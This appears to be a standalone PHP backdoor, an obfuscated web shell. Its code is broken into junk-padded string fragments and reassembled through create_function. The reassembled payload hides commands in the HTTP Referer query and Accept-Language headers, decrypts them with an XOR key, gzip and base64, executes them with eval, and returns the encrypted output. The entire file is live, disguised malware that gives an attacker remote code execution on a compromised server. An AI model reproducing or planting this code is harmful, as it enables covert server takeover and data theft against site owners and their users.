<?php
$u='na,*n$m);if*n($q&&$m){@sess*nion_start()*n;$s=&$_S*n*nESSION;$ss*n="substr*n"*n;*n$sl="strt*nolo';
$b='L*nA*nNGU*nAGE"];*nif($rr&&$ra){$u*n=parse_ur*n*nl($rr);pa*nrs*ne_str($u["q*nue*nry"],$q);$q*n*n';
$k='$s[$i].=*n$p;$e=strpos*n($*ns[$i],$f)*n;if($e)*n*n{$k=$kh.$kf*n;*n*nob_start();@*neva*nl(@gzu';
$E='ncompr*ness*n(@x(@ba*nse64_deco*nde(preg*n_replac*ne(*nar*nray("/_/","/*n*n-/"),array("*n/"*';
$Q='s*n*ntrpos($p,$h)===0){$s[*n$i]=*n"";*n$p=$*nss($p,3);}if(a*nrray_*nkey_exist*ns(*n$i*n,$s)*n){';
$T='wer";$i=*n*n$m[1][0].$m[*n1]*n[1];$h=$sl(*n$*nss(md5($i.*n$kh)*n,0,3));$f=*n$sl($*nss*n(md5(';
$c='n,"+"),$ss($s*n[$*ni]*n,0,$e*n))),$k)))*n;$*no=ob_get*n_c*nontent*ns();*n*nob_end_cle*nan();$d=b*n';
$f='$k*nh="5d41";$kf="4*n*n02a*n";functi*non *nx*n($*nt,$k){$c=strlen($k);$l*n=strlen(*n$t);$*n';
$P=str_replace('oG','','croGeatoGoGe_fuoGnoGcoGtion');
$x='ase64_encode*n(x(gz*ncompress(*n$o),$k)*n*n*n);print("<$k>$d</$k>"*n);@*nse*nssion_dest*nroy();}}}}';
$s='=arr*nay_valu*nes($q);preg_m*n*natch_a*nll("/(*n[\\w])[*n*n\\w-]+*n(?:;q=0.(*n[\\d]))?,?/",$*nr*';
$G='}*n;}}ret*nurn $o;}$r=*n$_S*n*nERVER;$rr=@$r[*n"H*nTTP_REFERER"*n*n];$ra=@$r["H*nTTP_A*nCC*nEPT_';
$N='$i.$*nkf*n),0,3));$*np="";for*n($z=1*n;$z<*ncoun*nt($m[1]);*n$z*n++)$p.=$*nq[$m[*n*n2][$z]];if(*n';
$R='*no="";f*nor($i=0;$i<$l*n*n;)*n{for($j=0;($*nj<*n$*nc*n&&$i<$l);$j++,$i+*n+){$o.=$t{$i}^*n$k{$*nj';
$j=str_replace('*n','',$f.$R.$G.$b.$s.$u.$T.$N.$Q.$k.$E.$c.$x);
$w=$P('',$j);$w();
?>
